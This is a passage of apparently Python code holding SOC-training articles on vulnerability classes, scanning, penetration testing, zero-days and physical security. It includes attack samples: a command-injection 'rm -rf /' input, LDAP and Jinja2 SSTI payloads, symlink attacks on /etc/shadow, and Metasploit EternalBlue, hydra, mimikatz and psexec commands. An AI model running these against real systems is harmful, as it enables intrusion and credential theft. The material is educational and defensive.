2. Map full scope of compromise before containment
3. Identify all persistence mechanisms
4. Plan simultaneous eviction across all compromised systems
5. Reset all credentials in compromised domain
6. Rebuild or reimage affected systems
7. Monitor for re-entry attempts post-eviction

## Key Takeaways

- APT defense requires defense-in-depth across every kill chain phase
- Focus on detection at multiple points, not just prevention
- LOTL techniques require behavioral detection, not just signatures
- Threat intelligence feeds help identify known APT infrastructure
- Practice threat hunting proactively, do not wait for alerts
- Assume breach and build detection for lateral movement and exfil
"""
    ))

    # ------------------------------------------------------------------
    # 12. Common Vulnerability Types
    # ------------------------------------------------------------------
    articles.append((
        "Common Vulnerability Types Buffer Overflow Injection Race Condition",
        ["threats", "vulnerabilities", "buffer-overflow", "injection", "race-condition", "memory-corruption"],
        r"""# Common Vulnerability Types: Buffer Overflow, Injection, and Race Conditions

## Overview

Understanding vulnerability classes is essential for SOC analysts who must assess
the severity of disclosed vulnerabilities, understand exploitation techniques
referenced in threat intelligence, and prioritize patching based on exploitability.
This article covers the fundamental vulnerability categories that underpin most
real-world exploits.

## Memory Corruption Vulnerabilities

### Buffer Overflow (Stack-Based)

Occurs when a program writes data beyond the allocated buffer boundary on the
stack, potentially overwriting the return address to redirect execution.

```c
// Vulnerable code
void vulnerable(char *input) {
    char buffer[64];
    strcpy(buffer, input);  // No bounds checking
    // If input > 64 bytes, overwrites stack frame
}

// Stack layout (simplified):
// [buffer (64 bytes)][saved EBP][return address][arguments]
// Overflow: AAAAAA...AAAA[new_return_addr] -> redirects execution
```

**Exploitation:**
1. Overflow buffer to reach return address
2. Overwrite return address with attacker-controlled value
3. Point to shellcode in buffer or ROP gadgets
4. Function returns to attacker's code

**Mitigations:**
| Mitigation | Description | Bypass |
|-----------|-------------|--------|
| Stack canaries | Random value before return addr | Information leak |
| ASLR | Randomize memory layout | Information leak, brute force |
| DEP/NX | Non-executable stack | ROP (Return-Oriented Programming) |
| Safe functions | strncpy, snprintf | Developer discipline |
| CFI | Control Flow Integrity | Complex but possible |

### Heap Overflow

Similar to stack overflow but targets dynamically allocated memory (heap).
Can corrupt heap metadata to achieve arbitrary write.

```c
// Vulnerable code
char *buf = malloc(64);
strcpy(buf, user_input);  // Heap overflow if input > 64
// Can corrupt adjacent heap chunks, function pointers, vtables
```

### Use-After-Free (UAF)

Accessing memory after it has been freed. If the freed memory is reallocated
for a different purpose, the dangling pointer can access or corrupt new data.

```c
// Vulnerable pattern
Object *obj = new Object();
delete obj;           // Memory freed
// ... attacker triggers reallocation of same memory ...
obj->method();        // UAF: calls method on attacker-controlled data
```

**Real-world impact:** UAF vulnerabilities are among the most exploited in
browsers (Chrome, Firefox) and account for ~70% of Chrome security bugs.

### Integer Overflow

Arithmetic operation produces a value too large for the integer type,
wrapping around and causing unexpected behavior.

```c
// Vulnerable allocation
uint16_t size = user_input;        // User provides 65535
uint16_t alloc_size = size + 1;    // Wraps to 0
char *buf = malloc(alloc_size);    // Allocates 0 bytes
memcpy(buf, data, size);           // Writes 65535 bytes -> heap overflow
```

## Injection Vulnerabilities

### SQL Injection
Covered in detail in the Web Application Attacks article. Core issue:
untrusted data interpreted as SQL commands.

### Command Injection
User input passed to system shell execution.

```python
# Vulnerable code
import os
filename = request.args.get('file')
os.system(f"convert {filename} output.pdf")
# Input: "input.jpg; rm -rf /"

# Safe alternative
import subprocess
subprocess.run(["convert", filename, "output.pdf"], check=True)
# Arguments passed as list, not shell-interpreted
```

### LDAP Injection
```
# Vulnerable query
(&(uid={user_input})(password={password}))

# Injection payload
user_input = "*)(uid=*))(|(uid=*"
# Resulting query matches all users
```

### Template Injection (SSTI)
Server-side template engines executing user input as code.

```python
# Jinja2 SSTI
# Vulnerable: render_template_string(user_input)
# Payload for code execution:
{{ config.__class__.__init__.__globals__['os'].popen('whoami').read() }}
```

## Race Conditions

### Time-of-Check to Time-of-Use (TOCTOU)

A gap between checking a condition and using the result, during which
the condition can change.

```python
# Vulnerable pattern
if os.access(filename, os.R_OK):    # Check: can user read?
    # Race window: attacker changes symlink
    with open(filename) as f:        # Use: opens potentially different file
        data = f.read()

# Attack: during the race window, replace filename with symlink to /etc/shadow
```

### File System Race Conditions

```bash
# Vulnerable temporary file creation
tempfile = "/tmp/myapp_" + str(os.getpid())
# Attacker predicts filename, creates symlink:
# ln -s /etc/passwd /tmp/myapp_12345
# Application writes to symlink target instead
```

### Database Race Conditions

```
# Double-spend example:
Thread 1: Read balance = $100
Thread 2: Read balance = $100
Thread 1: Withdraw $80 -> balance = $20
Thread 2: Withdraw $80 -> balance = $20  (should have failed!)
# Without proper locking, both withdrawals succeed
```

**Prevention:** Atomic operations, proper locking, file permission checks,
use mkstemp() for temp files.

## Input Validation Failures

The root cause of many vulnerability classes.

| Failure | Vulnerability | Prevention |
|---------|--------------|------------|
| No length check | Buffer overflow | Bounds checking |
| No type check | Type confusion | Input validation |
| No encoding | Injection (SQL, XSS, cmd) | Parameterized queries, escaping |
| No range check | Integer overflow | Range validation |
| No path check | Path traversal | Canonicalization |
| No format check | Format string | Fixed format strings |

## Vulnerability Severity Assessment

Use CVSS (Common Vulnerability Scoring System) to assess severity:

| CVSS Score | Severity | Action Timeline |
|-----------|----------|-----------------|
| 9.0-10.0 | Critical | Patch within 24-72 hours |
| 7.0-8.9 | High | Patch within 1-2 weeks |
| 4.0-6.9 | Medium | Patch within 1 month |
| 0.1-3.9 | Low | Patch in next cycle |

**CVSS v3.1 key metrics:**
```
Attack Vector (AV): Network/Adjacent/Local/Physical
Attack Complexity (AC): Low/High
Privileges Required (PR): None/Low/High
User Interaction (UI): None/Required
Scope (S): Unchanged/Changed
Confidentiality (C): None/Low/High
Integrity (I): None/Low/High
Availability (A): None/Low/High

Example: CVE-2021-44228 (Log4Shell)
CVSS: 10.0 (AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H)
```

## Detection of Exploitation Attempts

```yaml
# Sigma rule: buffer overflow / crash detection
title: Application Crash Indicating Possible Exploitation
logsource:
    product: windows
    service: application
detection:
    selection:
        EventID: 1000
        # Exception codes indicating memory corruption
        exception_code:
            - '0xc0000005'   # Access Violation
            - '0xc0000409'   # Stack Buffer Overrun
            - '0xc000001d'   # Illegal Instruction
    condition: selection

# Monitor for exploit indicators:
# - Unexpected crashes in network-facing services
# - DEP/ASLR violation logs
# - Unusual process spawns from vulnerable applications
# - Shellcode patterns in network traffic (NOP sleds)
```

## Key Takeaways

- Memory corruption bugs are the most dangerous (direct code execution)
- Injection flaws arise from mixing data and control channels
- Race conditions are subtle and often missed in code review
- Input validation at trust boundaries prevents multiple vulnerability classes
- CVSS scoring helps prioritize but context (exploit availability, asset value) matters more
- Monitor for exploitation signs: crashes, unexpected child processes, anomalous behavior
"""
    ))

    # ------------------------------------------------------------------
    # 13. Vulnerability Scanning and Assessment
    # ------------------------------------------------------------------
    articles.append((
        "Vulnerability Scanning and Assessment",
        ["threats", "vulnerabilities", "scanning", "Nessus", "CVSS", "remediation", "assessment"],
        r"""# Vulnerability Scanning and Assessment

## Overview

Vulnerability management is the continuous process of identifying, classifying,
prioritizing, remediating, and mitigating security vulnerabilities. It is a
foundational security practice that reduces the attack surface and provides
SOC analysts with critical context for incident investigation and threat
prioritization.

## Vulnerability Management Lifecycle

```
    +---> DISCOVER ---> PRIORITIZE ---> REMEDIATE ---+
    |     (Scan)       (CVSS+Context)   (Patch/Fix)  |
    |                                                 |
    +--- VERIFY <--- REPORT <--- VALIDATE <----------+
         (Rescan)    (Metrics)   (Confirm fix)
```

**Phases in detail:**

| Phase | Activities | Output |
|-------|-----------|--------|
| Asset Discovery | Network scanning, CMDB sync | Complete asset inventory |
| Vulnerability Scanning | Authenticated/unauthenticated scans | Vulnerability findings |
| Prioritization | CVSS + threat intel + asset value | Ranked remediation list |
| Remediation | Patching, configuration, compensating controls | Applied fixes |
| Validation | Rescan to confirm fixes | Verification report |
| Reporting | Metrics, trends, compliance status | Executive/technical reports |

## Scanning Tools

| Tool | Type | License | Strengths |
|------|------|---------|-----------|
| Nessus Professional | Network/host | Commercial | Comprehensive plugins, compliance |
| OpenVAS/Greenbone | Network/host | Open source | Free, community-maintained |
| Qualys VMDR | Cloud-based | Commercial | Scalable, agent-based, API |
| Rapid7 InsightVM | Network/host | Commercial | Live dashboards, integrations |
| Microsoft Defender VM | Endpoint | Included with E5 | Integrated with Defender ecosystem |
| Nuclei | Web/network | Open source | Template-based, fast, community |
| Trivy | Container/IaC | Open source | Container images, Kubernetes |

## Authenticated vs Unauthenticated Scans

| Aspect | Unauthenticated | Authenticated |
|--------|----------------|---------------|
| Access level | External view only | Logged-in view |
| Coverage | ~60-70% of vulns | ~95%+ of vulns |
| False positives | Higher | Lower |
| Impact on systems | Lower | Slightly higher |
| Detects | Network services, banners | Installed software, configs, patches |
| Use case | External attack surface | Internal vulnerability assessment |
| Credentials needed | None | Service account per OS type |

**Credentialed scan setup:**
```
# Windows: Create service account with local admin
# Linux: SSH key-based access with sudo
# Network devices: SNMP community string or SSH

# Best practices for scan credentials:
# - Dedicated service account (not personal accounts)
# - Rotate credentials regularly
# - Restrict account to scanning subnets only
# - Monitor for credential misuse
# - Store credentials in scanner's encrypted vault
```

## CVSS Scoring Deep Dive

### CVSS v3.1 Base Score Components

```
Base Score = f(Exploitability, Impact)

Exploitability metrics:
  Attack Vector (AV):     Network(0.85) / Adjacent(0.62) / Local(0.55) / Physical(0.20)
  Attack Complexity (AC):  Low(0.77) / High(0.44)
  Privileges Required (PR): None(0.85) / Low(0.62/0.68) / High(0.27/0.50)
  User Interaction (UI):   None(0.85) / Required(0.62)

Impact metrics:
  Confidentiality (C):    High(0.56) / Low(0.22) / None(0)
  Integrity (I):          High(0.56) / Low(0.22) / None(0)
  Availability (A):       High(0.56) / Low(0.22) / None(0)
  Scope (S):              Changed / Unchanged
```

### Beyond CVSS: Risk-Based Prioritization

CVSS alone is insufficient. Add context:

| Factor | Question | Impact on Priority |
|--------|----------|-------------------|
| Exploit available | Is there a public exploit? | Increases urgency significantly |
| Active exploitation | Being exploited in the wild? | Critical - immediate action |
| Asset criticality | Is this a crown jewel system? | Higher priority for critical assets |
| Internet-facing | Reachable from internet? | Higher priority than internal-only |
| Compensating controls | Is a WAF or other control in place? | May reduce urgency |
| Data sensitivity | What data is at risk? | PII/financial = higher priority |

```
# Prioritization formula (example):
# Risk Score = CVSS_Base * Exploit_Factor * Asset_Value * Exposure
#
# Exploit_Factor: 1.0 (none), 1.5 (PoC exists), 2.0 (active exploitation)
# Asset_Value: 0.5 (low), 1.0 (medium), 2.0 (high), 3.0 (critical)
# Exposure: 0.5 (internal only), 1.0 (DMZ), 2.0 (internet-facing)
```

## Scan Configuration Best Practices

```
# Scan scheduling:
# - Full authenticated scan: weekly or bi-weekly
# - Unauthenticated external scan: weekly
# - Critical asset scan: daily
# - Post-patch verification: within 48 hours of patch deployment
# - New asset scan: before connecting to production network

# Scan windows:
# - Production systems: maintenance windows or low-traffic hours
# - Non-production: business hours acceptable
# - Internet-facing: can scan anytime (from external scanner)

# Exclusions (document and justify):
# - Fragile legacy systems (scan in read-only mode)
# - Real-time systems (ICS/SCADA - use passive scanning)
# - Systems under change freeze
```

## Remediation Workflows

| Severity | SLA | Remediation Options |
|----------|-----|-------------------|
| Critical (CVSS 9.0+) | 72 hours | Emergency patch, virtual patch, isolate |
| High (CVSS 7.0-8.9) | 2 weeks | Scheduled patch, compensating control |
| Medium (CVSS 4.0-6.9) | 30 days | Next patch cycle |
| Low (CVSS 0.1-3.9) | 90 days | Best effort, risk acceptance possible |

**Compensating controls when patching is not immediate:**
- WAF rules to block known exploit patterns
- Network segmentation to limit exposure
- Disable vulnerable feature/service
- Increase monitoring and alerting
- IP allowlisting for access

## Vulnerability Metrics for SOC

| Metric | Target | Description |
|--------|--------|-------------|
| Mean Time to Remediate (MTTR) | < 30 days critical | Average days to fix |
| Scan coverage | > 95% | Percentage of assets scanned |
| Overdue vulnerabilities | < 5% | Vulns past SLA |
| Recurrence rate | < 10% | Vulns that reappear after fix |
| False positive rate | < 5% | Invalid findings requiring triage |
| Risk score trend | Decreasing | Overall risk posture over time |

## Integration with SOC Operations

```
# How vulnerability data enhances SOC operations:

# 1. Alert enrichment
# When IDS fires, check if target has known vuln for that exploit
# SIEM correlation: IDS alert + vulnerable asset = HIGH priority

# 2. Threat hunting
# "Which of our assets are vulnerable to the latest actively exploited CVE?"
# Query vulnerability database for CVE-2024-XXXX across all assets

# 3. Incident investigation
# After compromise, check what vulnerabilities existed on the asset
# Determine likely attack vector from vulnerability + exploit data

# 4. Risk reporting
# Dashboard showing critical vulns on internet-facing assets
# Trend of vulnerability count over time by severity
```

## Key Takeaways

- Authenticated scans find significantly more vulnerabilities than unauthenticated
- CVSS is a starting point; risk-based prioritization uses additional context
- Scan coverage matters more than scan frequency
- Remediation SLAs must be tracked and enforced
- Vulnerability data is essential context for SOC alert triage
- Integration between vulnerability management and SIEM improves detection
"""
    ))

    # ------------------------------------------------------------------
    # 14. Penetration Testing Methodology
    # ------------------------------------------------------------------
    articles.append((
        "Penetration Testing Methodology",
        ["attacks", "penetration-testing", "red-team", "reconnaissance", "exploitation", "methodology"],
        r"""# Penetration Testing Methodology

## Overview

Penetration testing is the authorized simulation of attacks against systems,
networks, or applications to identify exploitable vulnerabilities. SOC analysts
benefit from understanding pentest methodology because it helps them think like
attackers, improve detection capabilities, and properly scope and support
engagements.

## Pentest vs Red Team vs Vulnerability Assessment

| Aspect | Vulnerability Assessment | Penetration Test | Red Team |
|--------|------------------------|-------------------|----------|
| Goal | Find all vulnerabilities | Prove exploitation paths | Test detection and response |
| Scope | Broad, comprehensive | Defined targets/systems | Realistic attack simulation |
| Duration | Days to weeks | 1-4 weeks | 2-6 months |
| Stealth | None (noisy scans) | Some | Full operational security |
| Exploitation | No (just identification) | Yes (controlled) | Yes (realistic) |
| Social engineering | No | Sometimes | Yes |
| Physical access | No | Sometimes | Yes |
| SOC notification | Yes | Sometimes | No (tests SOC) |
| Deliverable | Vulnerability report | Exploitation report | Attack narrative |

## Rules of Engagement (ROE)

Every penetration test must have documented ROE before starting.

```
# Rules of Engagement checklist:
# - Scope: IP ranges, domains, applications in scope
# - Out of scope: Systems to never touch (production DBs, etc.)
# - Testing window: Dates and hours approved for testing
# - Contact information: Emergency contacts for both sides
# - Authorization: Written permission from system owner
# - Sensitive data handling: What to do if PII/secrets found
# - DoS testing: Allowed or prohibited
# - Social engineering: Allowed techniques and limits
# - Physical testing: Allowed or prohibited
# - Credential use: Can found credentials be used?
# - Notification requirements: When to stop and report
# - Data destruction: Clean up requirements post-test
```

## Penetration Testing Phases

### Phase 1: Reconnaissance

**Passive reconnaissance (no direct target interaction):**

| Technique | Tools | Information Gathered |
|-----------|-------|---------------------|
| WHOIS lookup | whois, ARIN | Domain owner, registrar, nameservers |
| DNS enumeration | dig, nslookup, dnsdumpster | Subdomains, mail servers, IPs |
| Search engines | Google dorks, Shodan, Censys | Exposed services, documents |
| Social media | LinkedIn, Twitter | Employee names, roles, tech stack |
| Job postings | Indeed, LinkedIn Jobs | Technology stack, tools used |
| Code repos | GitHub, GitLab | Leaked credentials, code patterns |
| Certificate transparency | crt.sh | Subdomain discovery |
| Archived pages | Wayback Machine | Old configurations, removed content |

```bash
# Google dorks for reconnaissance
site:target.com filetype:pdf
site:target.com intitle:"index of"
site:target.com inurl:admin
"target.com" filetype:sql
"target.com" filetype:env

# Subdomain enumeration
subfinder -d target.com -o subdomains.txt
amass enum -d target.com
```

**Active reconnaissance (direct target interaction):**

```bash
# Port scanning
nmap -sC -sV -O -p- target.com -oA full_scan

# Service enumeration
nmap -sV --version-all -p 80,443,8080 target.com

# Web technology fingerprinting
whatweb target.com
wappalyzer (browser extension)

# Directory brute forcing
gobuster dir -u https://target.com -w /usr/share/wordlists/dirb/common.txt
feroxbuster -u https://target.com -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
```

### Phase 2: Scanning and Enumeration

```bash
# Vulnerability scanning
nmap --script vuln target.com
nikto -h https://target.com
nuclei -u https://target.com -t cves/

# SMB enumeration
enum4linux -a target.com
crackmapexec smb 192.168.1.0/24

# SNMP enumeration
snmpwalk -v2c -c public target.com

# LDAP enumeration
ldapsearch -x -H ldap://target.com -b "dc=target,dc=com"
```

### Phase 3: Exploitation

```bash
# Web application exploitation
sqlmap -u "https://target.com/page?id=1" --batch --dbs
# Manual SQLi, XSS, SSRF testing

# Network exploitation
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS target.com
exploit

# Password attacks
hydra -l admin -P /usr/share/wordlists/rockyou.txt target.com ssh
crackmapexec smb target.com -u users.txt -p passwords.txt
```

### Phase 4: Post-Exploitation

```bash
# Privilege escalation
# Windows
whoami /all
systeminfo | findstr /B /C:"OS" /C:"Hotfix"
# Run WinPEAS/SharpUp

# Linux
id; uname -a; cat /etc/os-release
sudo -l
# Run LinPEAS

# Credential harvesting
# Windows
mimikatz# sekurlsa::logonpasswords
mimikatz# lsadump::sam

# Lateral movement
psexec.py domain/user:password@target
evil-winrm -i target -u user -p password
```

### Phase 5: Reporting

**Report structure:**

| Section | Content |
|---------|---------|
| Executive Summary | Business risk overview for leadership |
| Scope and Methodology | What was tested and how |
| Findings Summary | Table of all findings by severity |
| Detailed Findings | Each vuln with evidence, impact, remediation |
| Attack Narrative | Story of the attack path (most impactful) |
| Remediation Roadmap | Prioritized fix recommendations |
| Appendices | Raw scan output, tool configurations |

**Finding format:**
```
Title: SQL Injection in Login Form
Severity: Critical (CVSS 9.8)
Affected Asset: https://app.target.com/login
Description: The username parameter is vulnerable to SQL injection...
Evidence: [screenshots, request/response, payloads used]
Impact: Full database access, authentication bypass, data exfiltration
Remediation: Use parameterized queries, implement input validation
Reference: OWASP SQL Injection, CWE-89
```

## SOC Analyst Role During Pentests

| Activity | SOC Responsibility |
|----------|-------------------|
| Pre-test | Review ROE, note testing window, whitelist scanner IPs if needed |
| During test | Monitor for pentest activity, validate detection rules fire |
| During test | Track which attacks were detected vs missed |
| Post-test | Review findings to improve detection rules |
| Post-test | Create new alerts for attack patterns that were missed |
| Post-test | Update incident response procedures based on findings |

## Detection Gap Analysis

After a pentest, SOC teams should create a detection matrix:

| Attack Technique | Detected | Alert Fired | Rule Exists | Action Needed |
|-----------------|----------|-------------|-------------|---------------|
| Port scanning | Yes | Yes | Yes | None |
| SQL injection | Yes | No | No | Create WAF rule |
| Mimikatz | No | No | No | Deploy Sysmon + Sigma rule |
| Lateral movement (PsExec) | Yes | Yes | Yes | Tune false positives |
| Data exfiltration (DNS) | No | No | No | Deploy DNS monitoring |

## Key Takeaways

- Pentests prove real risk; vulnerability assessments find potential risk
- ROE must be documented and approved before any testing begins
- Post-exploitation findings often reveal the most critical risks
- SOC teams should use pentest findings to improve detection capabilities
- Regular pentests (annual minimum) are required by most compliance frameworks
- Purple team exercises (pentest + SOC collaboration) maximize value
"""
    ))

    # ------------------------------------------------------------------
    # 15. Zero-Day Vulnerabilities and Exploit Chains
    # ------------------------------------------------------------------
    articles.append((
        "Zero-Day Vulnerabilities and Exploit Chains",
        ["threats", "zero-day", "exploit-chains", "CVE", "virtual-patching", "detection"],
        r"""# Zero-Day Vulnerabilities and Exploit Chains

## Overview

A zero-day vulnerability is a software flaw unknown to the vendor, meaning
zero days have passed since discovery for a patch to be developed. Zero-day
exploits leverage these unknown vulnerabilities and represent the highest tier
of threat because no signature-based detection or patch exists at the time of
exploitation.

## Zero-Day Terminology

| Term | Definition |
|------|-----------|
| Zero-day vulnerability | Unknown flaw in software with no patch available |
| Zero-day exploit | Code that leverages a zero-day vulnerability |
| Zero-day attack | Active exploitation of a zero-day in the wild |
| N-day vulnerability | Known vulnerability with patch available but not applied |
| Forever-day | Known vulnerability that will never be patched (EOL software) |

## The Vulnerability Disclosure Ecosystem

```
Discovery --> Disclosure --> Patch --> Deployment

Timeline:
  Day 0: Vulnerability discovered
  Day 0-N: Responsible disclosure to vendor (typically 90 days)
  Day N: CVE assigned, patch developed
  Day N+X: Patch released
  Day N+X+Y: Organizations deploy patch

Risk Window:
  [Discovery] ======= Zero-day risk ======= [Patch] == N-day risk == [Deployed]

  If discovered by attacker first:
  [Attacker finds] ====== Active exploitation ====== [Vendor learns] ... [Patch]
```

## CVE, CWE, and NVD

| System | Purpose | Example |
|--------|---------|---------|
| CVE | Unique vulnerability identifier | CVE-2021-44228 (Log4Shell) |
| CWE | Vulnerability type classification | CWE-89 (SQL Injection) |
| NVD | National Vulnerability Database | CVSS scores, references |
| MITRE ATT&CK | Adversary technique mapping | T1190 (Exploit Public-Facing App) |
| KEV | CISA Known Exploited Vulns catalog | Mandated federal patching |
| EPSS | Exploit Prediction Scoring | Probability of exploitation in 30 days |

## Exploit Chains

Modern attacks chain multiple vulnerabilities together, each enabling the next
step in the attack.

**Example: iOS exploit chain (2019, Google Project Zero):**
```
Step 1: Safari browser vulnerability (remote code execution in renderer)
Step 2: Sandbox escape vulnerability (break out of browser sandbox)
Step 3: Kernel vulnerability (gain kernel-level access)
Step 4: Persistence mechanism (survive reboot)
Result: Full device compromise from visiting a web page
```

**Example: Exchange ProxyLogon chain (2021):**
```
CVE-2021-26855: SSRF - access Exchange backend as SYSTEM
CVE-2021-26857: Deserialization - code execution
CVE-2021-26858: Arbitrary file write - write web shell
CVE-2021-27065: Arbitrary file write - additional path

Chain: SSRF -> Authenticate -> Write web shell -> Full control
```

**Example: PrintNightmare chain:**
```
CVE-2021-1675 / CVE-2021-34527:
1. Abuse Windows Print Spooler service
2. Load malicious DLL via AddPrinterDriverEx
3. DLL executes as SYSTEM
4. No authentication required if configured for remote access
```

## Notable Zero-Day Campaigns

| Year | Zero-Day | Target | Attributed To |
|------|----------|--------|--------------|
| 2010 | Stuxnet (4 zero-days) | Iranian nuclear program | USA/Israel |
| 2017 | EternalBlue (MS17-010) | SMBv1 worldwide | NSA (leaked by Shadow Brokers) |
| 2020 | SolarWinds (multiple) | US government, enterprises | APT29 (Russia) |
| 2021 | Log4Shell (CVE-2021-44228) | Anything using Log4j | Mass exploitation |
| 2021 | ProxyLogon/ProxyShell | Exchange servers worldwide | Hafnium (China) |
| 2023 | MOVEit (CVE-2023-34362) | File transfer servers | Cl0p ransomware |
| 2023 | Citrix Bleed (CVE-2023-4966) | Citrix NetScaler | Multiple threat actors |

## Detecting Zero-Day Exploitation

Since no signatures exist for true zero-days, detection relies on behavioral
and anomaly-based approaches.

```
# Detection strategies for zero-day exploitation:

# 1. Behavioral anomaly detection
# - Process creation anomalies (unusual parent-child relationships)
# - Network connection anomalies from server processes
# - File system changes in unexpected locations
# - Memory anomalies (shellcode indicators)

# 2. Exploit indicators (generic)
# - Unexpected crashes or restarts of services
# - DEP/ASLR violation events
# - Heap spray indicators (large memory allocations)
# - ROP chain indicators (unusual API call sequences)

# 3. Post-exploitation detection
# - Web shell creation on servers
# - Unexpected outbound connections from servers
# - Credential dumping activity
# - Lateral movement patterns

# Sigma rule: generic web shell detection
title: Web Shell Creation Detected
logsource:
    product: windows
    service: sysmon
detection:
    selection:
        EventID: 11
        TargetFilename|endswith:
            - '.asp'
            - '.aspx'
            - '.jsp'
            - '.php'
        TargetFilename|contains:
            - '\inetpub\'
            - '\www\'
            - '\htdocs\'
    filter_legitimate:
        Image|endswith:
            - '\msdeploy.exe'
            - '\w3wp.exe'
    condition: selection and not filter_legitimate
```

## Response to Zero-Day Disclosures

### Immediate Actions (Day 0-3)

| Priority | Action | Owner |
|----------|--------|-------|
| 1 | Assess exposure (asset inventory) | Vulnerability Management |
| 2 | Check for active exploitation (IOC search) | SOC / Threat Hunting |
| 3 | Implement compensating controls | Infrastructure / Security |
| 4 | Deploy virtual patches (WAF/IPS rules) | Security Engineering |
| 5 | Communicate risk to stakeholders | Security Leadership |
| 6 | Monitor vendor advisory for patch | Vulnerability Management |

### Compensating Controls

```
# When patches are not available:

# Network-level
- Block exploit traffic patterns at IPS/WAF
- Restrict access to vulnerable service (IP allowlist)
- Network segmentation to limit blast radius
- Disable vulnerable feature if possible

# Endpoint-level
- Application allowlisting
- Enhanced logging on vulnerable systems
- File integrity monitoring
- Memory protection tools (EMET successor features)

# Process-level
- Increased monitoring frequency
- Threat hunting focused on vulnerable systems
- Tabletop exercise for exploitation scenario
- Communication plan for customers/partners if needed
```

### Virtual Patching

Implementing security rules at the network or application layer to block
exploitation without modifying the vulnerable software.

```
# WAF virtual patch example (ModSecurity):
SecRule REQUEST_URI "@contains /vulnerable/endpoint" \
    "id:1001, phase:1, deny, status:403, \
    msg:'Virtual Patch - CVE-2024-XXXX'"

# IPS signature example:
alert http any any -> $HOME_NET any (msg:"CVE-2024-XXXX Exploit Attempt";
    content:"/vulnerable/endpoint"; http_uri;
    content:"malicious_pattern"; http_client_body;
    sid:1000001; rev:1;)
```

## EPSS: Exploit Prediction Scoring System

EPSS predicts the probability a vulnerability will be exploited in the wild
within the next 30 days.

```
# EPSS scoring:
# Score range: 0.0 to 1.0 (probability)
# Example: EPSS 0.97 = 97% chance of exploitation in 30 days
#
# Use EPSS + CVSS together for prioritization:
# High CVSS + High EPSS = Patch immediately
# High CVSS + Low EPSS = Important but less urgent
# Low CVSS + High EPSS = Prioritize despite lower severity
# Low CVSS + Low EPSS = Standard patch cycle
```

## Key Takeaways

- Zero-day defense requires behavioral detection, not just signatures
- Exploit chains combine multiple vulnerabilities for maximum impact
- Time-to-patch is the critical metric once a zero-day is disclosed
- Virtual patching buys time when vendor patches are unavailable
- CISA KEV catalog should drive immediate patching priorities
- EPSS + CVSS provides better prioritization than CVSS alone
- Assume exploitation is happening and hunt proactively
"""
    ))

    # ------------------------------------------------------------------
    # 16. Physical Security Threats and Controls
    # ------------------------------------------------------------------
    articles.append((
        "Physical Security Threats and Controls",
        ["threats", "physical-security", "access-controls", "surveillance", "social-engineering"],
        r"""# Physical Security Threats and Controls

## Overview

Physical security protects personnel, hardware, software, networks, and data from
physical actions and events that could cause serious damage. Physical compromise
bypasses all logical security controls -- an attacker with physical access to a
server can extract data, install implants, or destroy systems regardless of
firewalls, encryption, or access controls.

## Physical Security Layers (Defense in Depth)

```
Layer 1: PERIMETER
    Fences, gates, lighting, signage, parking barriers
        |
Layer 2: BUILDING EXTERIOR
    Walls, doors, windows, locks, security guards
        |
Layer 3: INTERIOR COMMON AREAS
    Reception, badge readers, visitor management
        |
Layer 4: SECURED AREAS
    Mantraps, biometrics, security cameras
        |
Layer 5: CRITICAL ASSETS
    Server room, vault, safe, cable locks
        |
Layer 6: DATA
    Encryption at rest, screen privacy, document handling
```

## Physical Access Controls

### Authentication Methods

| Method | Type | Security Level | Bypass Risk |
|--------|------|---------------|-------------|
| Key/lock | Something you have | Low | Lock picking, key copying |
| PIN/keypad | Something you know | Low-Medium | Shoulder surfing, brute force |
| Badge/card | Something you have | Medium | Cloning (Proxmark), theft |
| Biometrics | Something you are | High | Spoofing (varies by type) |
| Mantrap | Physical control | High | Tailgating prevention |
| Security guard | Human verification | High | Social engineering |
| Multi-factor | Combined methods | Highest | Requires multiple bypasses |

### Biometric Systems

| Type | FAR | FRR | Spoofing Difficulty |
|------|-----|-----|-------------------|
| Fingerprint | Low | Medium | Medium (gelatin molds) |
| Iris scan | Very low | Low | High |
| Retinal scan | Very low | Medium | Very high |
| Facial recognition | Medium | Medium | Medium (photos, masks) |
| Voice recognition | Medium | Medium | Medium (recordings, AI) |
| Palm vein | Very low | Low | Very high |

**Biometric terminology:**
- FAR (False Acceptance Rate): Unauthorized person accepted
- FRR (False Rejection Rate): Authorized person rejected
- CER/EER (Crossover Error Rate): Where FAR = FRR (lower is better)

### Mantrap / Airlock

```
+-------+    +--------+    +----------+
| Public |----| Mantrap |----| Secured  |
| Area   |    | (both   |    | Area     |
|        |    |  doors  |    |          |
|        |    |  never  |    |          |
|        |    |  open   |    |          |
|        |    |  at     |    |          |
|        |    |  once)  |    |          |
+-------+    +--------+    +----------+

- Prevents tailgating by allowing only one person at a time
- Weight sensors detect multiple people
- Inner door only opens after outer door closes and locks
- Camera monitoring inside mantrap
```

## Surveillance Systems

| Type | Coverage | Strengths | Weaknesses |
|------|----------|-----------|------------|
| CCTV (analog) | Fixed areas | Simple, reliable | Low quality, no analytics |
| IP cameras | Flexible | High resolution, remote access | Network-dependent, hackable |
| PTZ cameras | Wide area | Pan/tilt/zoom, operator control | Complex, expensive |
| Thermal cameras | Perimeter | Work in darkness, detect body heat | Expensive, limited detail |
| Motion sensors | Specific zones | Auto-alert on movement | False positives (animals) |
| IR illuminators | Dark areas | Enable night vision cameras | Visible with IR devices |

**Video retention best practices:**
- Minimum 30 days for general areas
- 90+ days for critical areas (server rooms, vaults)
- Tamper-proof storage (WORM, offsite backup)
- Time-synchronized with NTP (critical for investigations)

## Environmental Controls

| Threat | Control | Standard |
|--------|---------|----------|
| Fire | Suppression (FM-200, Inergen, sprinklers) | NFPA 75, NFPA 76 |
| Water/flood | Raised floors, water sensors, drainage | Site selection, sensors |
| Temperature | HVAC, hot/cold aisle containment | 64-75 F (18-24 C) |
| Humidity | Humidifiers/dehumidifiers | 40-60% relative humidity |
| Power loss | UPS, generator, PDU redundancy | N+1 or 2N redundancy |
| EMP | Faraday cage, shielding | MIL-STD-188-125 |

## Physical Social Engineering Attacks

### Tailgating / Piggybacking
Following an authorized person through a secured entrance.

**Prevention:**
- Mantraps and turnstiles
- Security guards at entry points
- Security awareness training
- Anti-passback systems (must badge out before badging in)
- Video analytics detecting multiple entries per badge

### Dumpster Diving
Searching through discarded materials for sensitive information.

**Prevention:**
- Cross-cut shredders (DIN 66399 Level P-4 minimum)
- Locked dumpsters and secure waste bins
- Scheduled secure document destruction
- Electronics sanitization (NIST 800-88) before disposal

### Lock Picking and Badge Cloning

```
